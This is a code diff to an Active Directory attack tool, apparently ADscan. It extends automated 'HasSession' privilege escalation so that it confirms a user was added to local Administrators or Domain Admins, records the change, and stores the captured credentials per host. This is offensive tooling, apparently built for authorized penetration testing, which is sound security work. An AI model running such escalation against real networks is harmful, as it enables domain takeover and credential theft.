@@ -13186,12 +13608,24 @@ def execute_selected_attack_path(
                                 domain=domain,
                                 target_user=target_user,
                             )
-                        membership = _is_user_domain_admin_via_sid(
-                            shell,
-                            domain=domain,
-                            target_user=target_user,
-                            auth_username=exec_username,
-                            auth_password=password,
+                        membership = (
+                            _is_user_domain_admin_via_sid(
+                                shell,
+                                domain=domain,
+                                target_user=target_user,
+                                auth_username=exec_username,
+                                auth_password=password,
+                            )
+                            if is_dc_target
+                            else _is_user_local_admin_via_net(
+                                shell,
+                                domain=domain,
+                                exec_username=exec_username,
+                                exec_password=password,
+                                target_host=target_host,
+                                session_user=session_user,
+                                target_user=target_user,
+                            )
                         )
                         verified_da = membership is True
 
@@ -13214,7 +13648,8 @@ def execute_selected_attack_path(
                                 "session_user": session_user,
                                 "target_user": target_user,
                                 "mode": mode_label,
-                                "group": selected_group or "RID-512",
+                                "group": selected_group
+                                or ("RID-512" if is_dc_target else "Administrators"),
                                 "exec_context_source": exec_context_source,
                             },
                             captured_principal=target_user,
@@ -13222,11 +13657,81 @@ def execute_selected_attack_path(
                             credential_type="password",
                         )
 
-                        print_info(
-                            "HasSession escalation confirmed: "
-                            f"{mark_sensitive(target_user, 'user')} is now in "
-                            "Domain Admins (RID 512)."
-                        )
+                        if is_dc_target:
+                            print_info(
+                                "HasSession escalation confirmed: "
+                                f"{mark_sensitive(target_user, 'user')} is now in "
+                                "Domain Admins (RID 512)."
+                            )
+                        else:
+                            print_info(
+                                "HasSession escalation confirmed: "
+                                f"{mark_sensitive(target_user, 'user')} is now in the "
+                                f"local Administrators group on {marked_host} "
+                                "(host-local, not domain-wide)."
+                            )
+
+                        # Keep the runtime membership snapshot in sync with this
+                        # VERIFIED group add so downstream attack-path
+                        # materialization in the SAME run sees the escalation
+                        # without re-enumerating — mirrors the exploits.py
+                        # AddMember follow-up. Only recorded for a FRESHLY
+                        # CREATED account (create_new_user): the group add is
+                        # then unambiguously new. A REUSE_EXISTING account's
+                        # membership state before this step is unknown here
+                        # (the plan does not track it), so it is never recorded
+                        # as an ADscan-attributed runtime add — matching the
+                        # already-a-member exemption used elsewhere. Symmetric
+                        # with the rollback below, which only ever removes the
+                        # membership it recorded here.
+                        if create_new_user and _hs_user_added_to_da:
+                            try:
+                                if is_dc_target:
+                                    from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
+                                        add_runtime_user_group_membership,
+                                    )
+
+                                    add_runtime_user_group_membership(
+                                        shell,
+                                        domain,
+                                        username=target_user,
+                                        group_name=selected_group or "Domain Admins",
+                                        source="hassession_attack_step",
+                                        evidence={
+                                            "action": "add_member",
+                                            "operator": exec_username,
+                                            "target_host": target_host,
+                                        },
+                                        origin_kind="directory_write",
+                                        origin_technique="hassession",
+                                        origin_relation="AddMember",
+                                        cleanup_behavior="remove_directory_and_runtime",
+                                    )
+                                else:
+                                    from adscan_internal.services.membership_snapshot import (  # noqa: PLC0415
+                                        add_runtime_admin_to_edge,
+                                    )
+
+                                    add_runtime_admin_to_edge(
+                                        shell,
+                                        domain,
+                                        username=target_user,
+                                        host_identifier=target_host,
+                                        source="hassession_attack_step",
+                                        evidence={
+                                            "action": "add_to_local_administrators",
+                                            "operator": exec_username,
+                                        },
+                                    )
+                            except Exception as membership_exc:  # noqa: BLE001
+                                telemetry.capture_exception(membership_exc)
+                                print_exception(exception=membership_exc)
+                                print_info_debug(
+                                    "[hassession] Group membership changed on the "
+                                    "target, but ADscan could not update the runtime "
+                                    "membership snapshot."
+                                )
+
                         if hasattr(shell, "add_credential"):
                             credential_to_register = target_password or (
                                 _get_stored_domain_credential_for_user(
@@ -13238,10 +13743,21 @@ def execute_selected_attack_path(
                                     shell, "add_credential", None
                                 )
                                 if callable(add_credential_fn):
+                                    # A non-DC target is a LOCAL account/group
+                                    # membership — scope the stored credential to
+                                    # target_host, never as a domain-wide one
+                                    # (matches the local_credentials store
+                                    # contract; see CLAUDE.md § Credential
+                                    # storage).
                                     add_credential_fn(
                                         domain,
                                         target_user,
                                         credential_to_register,
+                                        **(
+                                            {}
+                                            if is_dc_target
+                                            else {"host": target_host}
+                                        ),
                                     )
                             else:
                                 print_info_debug(
@@ -13292,6 +13808,7 @@ def execute_selected_attack_path(
                             user_created_by_us=_hs_user_created_by_us,
                             group_candidates=group_candidates,
                             non_interactive=non_interactive,
+                            is_dc_target=is_dc_target,
                         )
                         _clear_hassession_cleanup_checkpoint(shell, domain=domain)
                 if hassession_step_failed:
@@ -15045,6 +15562,19 @@ def _offer_attack_paths_for_execution_summaries_impl(
             print_warning(
                 "No actionable attack paths are currently executable because the "
                 "available paths are not implemented for execution."
+            )
+        elif (
+            reasons["status_filtered"] > 0
+            and non_actionable_total == reasons["status_filtered"]
+        ):
+            # Every path was excluded by the status filter — the dead end an
+            # already-executed workspace hits, whose remedy (a status reset) was
+            # documented in the code and never told to the operator.
+            _print_status_filtered_dead_end(
+                domain=domain,
+                excluded_statuses=_statuses_excluded_by_filter(
+                    summaries, desired_statuses=desired_statuses_set
+                ),
             )
         else:
             print_info(
